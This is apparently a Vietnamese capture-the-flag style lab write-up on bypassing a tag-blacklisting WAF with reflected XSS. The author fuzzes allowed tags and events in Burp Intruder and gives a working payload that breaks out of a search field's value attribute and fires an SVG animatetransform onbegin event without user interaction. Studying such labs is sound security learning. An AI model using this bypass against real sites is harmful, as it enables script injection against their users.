![[Pasted image 20261021080854.png]]
## Mục tiêu
WAF chặn các tag phổ biến nhưng **bỏ sót một số tag và event của SVG**. Khai thác để gọi `alert()`.

## Các bước

**1. Thử payload chuẩn** — bị chặn:
```html
<img src=1 onerror=alert(1)>
```

**2. Dò tag được phép** — Burp Intruder:
- Search term: `<§§>`
- Payload: **Copy tags to clipboard** từ XSS Cheat Sheet → Paste → Start attack
- Kết quả: hầu hết 400, nhưng **`svg`, `animatetransform`, `title`, `image`** trả về **200**.
=> tiếp tục quy trình dò tag, event ==> và cuối cùng đưa ra payload
-> ==WAF quên chặn các tag SVG này.==
![[Pasted image 20261021084306.png|460]]
**3. Dò event được phép** — tiếp tục Intruder:
- Search term: `<svg><animatetransform%20§§=1>`
- Payload: **Copy events to clipboard** → Paste → Start attack
- Kết quả: chỉ **`onbegin`** trả về **200**.

**4. Payload hoàn chỉnh** — mở trực tiếp trên trình duyệt:
```
/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
=> cho lên url để get tới url chứa payload
Sau khi decode:
```html
"><svg><animatetransform onbegin=alert(1)>
```

![[Pasted image 20261021082556.png]]
## Giải thích nhanh

| Thành phần           | Vai trò                                                                                 |
| :------------------- | :-------------------------------------------------------------------------------------- |
| `%22%3E` (`">`)      | Thoát khỏi thuộc tính `value="..."` của ô search, đóng thẻ hiện tại, mở ngữ cảnh HTML   |
| `<svg>`              | Tag SVG — WAF không chặn                                                                |
| `<animatetransform>` | Tag con của SVG, có animation                                                           |
| `onbegin=alert(1)`   | Event tự ==kích hoạt ngay khi animation bắt đầu== -> **không cần tương tác người dùng** |
|                      |                                                                                         |
![[Pasted image 20261021082707.png]]
> [!NOTE]
> 
> - WAF blacklist theo tag HTML thường **bỏ quên namespace SVG** (`<svg>`, `<animatetransform>`, `<title>`, `<image>`, …).
> - `onbegin` là event **tự động** của SVG animation → phù hợp với yêu cầu "no user interaction", không cần `tabindex` hay fragment `#id` như bài custom tag.
> - Quy trình vẫn là: **fuzz tag trước → fuzz event sau** bằng Intruder + cheat sheet.

![[Pasted image 20261021083007.png]]